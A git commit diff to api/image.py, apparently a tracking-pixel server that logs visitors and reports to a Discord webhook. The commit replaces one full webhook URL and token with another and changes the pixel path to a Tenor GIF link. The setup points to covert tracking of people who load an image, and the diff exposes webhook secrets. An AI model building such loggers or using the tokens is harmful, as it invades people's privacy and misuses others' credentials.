cd884e4117c237e847579942499931a849539e24
worknfs11-create <worknfs11@gmail.com>
2025-11-27 04:15:51 -0500

    Update Discord webhook and pixel path

--- api/image.py
+++ api/image.py
@@ -10,8 +10,8 @@ from email.utils import formatdate
 
 PORT = 8000
 LOG_FILE = "access.log"
-DISCORD_WEBHOOK = ("https://discord.com/api/webhooks/1398083193265062020/OL-nBYHkOjSi8Nf50TJ9vA4UTyT6dhNcSTlF6vc4B-UEgmf8nHtnvMzj7DGd8iLiZDjt")  # Add your Discord webhook URL here
-PIXEL_PATH = "/tracking_pixel.gif"
+DISCORD_WEBHOOK = ("https://discord.com/api/webhooks/1443529265080434730/G-cdZ_IvjbSPgTDM-zRspzwPuMCML1GkGChYjiDtzy0RMt1qodIi6udbTDP-vUUHwgfZ")  # Add your Discord webhook URL here
+PIXEL_PATH = "https://tenor.com/view/flight-reacts-flightreacts-tongue-tongue-laugh-gif-13724048537815479089"
 PIXEL_DATA = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
 
 class TrackingHandler(BaseHTTPRequestHandler):
